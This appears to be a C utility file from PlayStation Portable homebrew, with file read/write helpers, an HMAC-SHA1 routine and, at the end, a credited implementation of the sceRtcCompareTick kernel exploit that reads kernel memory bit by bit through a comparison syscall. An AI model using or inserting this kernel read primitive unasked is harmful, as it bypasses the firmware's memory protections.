#include "utils.h"
#include "types.h"

#include <psprtc.h>
#include <mbedtls/md.h>

void dump_data(const u8 *data, u64 size) {
	u64 i;
	for (i = 0; i < size; i++)
		dbglogger_printf("%02X", data[i]);
	dbglogger_printf("\n");
}

int get_file_size(const char *file_path, u64 *size) {
	struct stat stat_buf;

	if (!file_path || !size)
		return -1;

	if (stat(file_path, &stat_buf) < 0)
		return -1;

	*size = stat_buf.st_size;

	return 0;
}

int read_file(const char *file_path, u8 *data, u64 size) {
	FILE *fp;

	if (!file_path || !data)
		return -1;

	fp = fopen(file_path, "rb");
	if (!fp)
		return -1;

	memset(data, 0, size);

	if (fread(data, 1, size, fp) != size) {
		fclose(fp);
		return -1;
	}

	fclose(fp);

	return 0;
}

int write_file(const char *file_path, u8 *data, u64 size) {
	FILE *fp;

	if (!file_path || !data)
		return -1;

	fp = fopen(file_path, "wb");
	if (!fp)
		return -1;

	if (fwrite(data, 1, size, fp) != size) {
		fclose(fp);
		return -1;
	}

	fclose(fp);

	return 0;
}

int calculate_hmac_hash(const u8 *data, u64 size, const u8 *key, u32 key_length, u8 output[20]) {
	if (!key_length || !output)
		return -1;

	mbedtls_md_hmac(mbedtls_md_info_from_type(MBEDTLS_MD_SHA1), key, key_length, data, size, output);

	return 0;
}

u64 align_to_pow2(u64 offset, u64 alignment) {
	return (offset + alignment - 1) & ~(alignment - 1);
}

/*
  sceRtcCompareTick kernel exploit by davee, implementation by CelesteBlue
  https://github.com/PSP-Archive/LibPspExploit/blob/main/kernel_read.c
*/

// input: 4-byte-aligned kernel address to a 64-bit integer
// return *addr >= value;
static int is_ge_u64(uint32_t addr, uint32_t *value) {
	return (int)sceRtcCompareTick((uint64_t *)value, (uint64_t *)addr) <= 0;
}

// input: 4-byte-aligned kernel address
// return *addr
uint64_t pspXploitKernelRead64(uint32_t addr) {
	uint32_t value[2] = {0, 0};
	uint32_t res[2] = {0, 0};
	int bit_idx = 0;
	for (; bit_idx < 32; bit_idx++) {
		value[1] = res[1] | (1 << (31 - bit_idx));
		if (is_ge_u64(addr, value))
			res[1] = value[1];
	}
	value[1] = res[1];
	bit_idx = 0;
	for (; bit_idx < 32; bit_idx++) {
		value[0] = res[0] | (1 << (31 - bit_idx));
		if (is_ge_u64(addr, value))
			res[0] = value[0];
	}
	return *(uint64_t*)res;
}
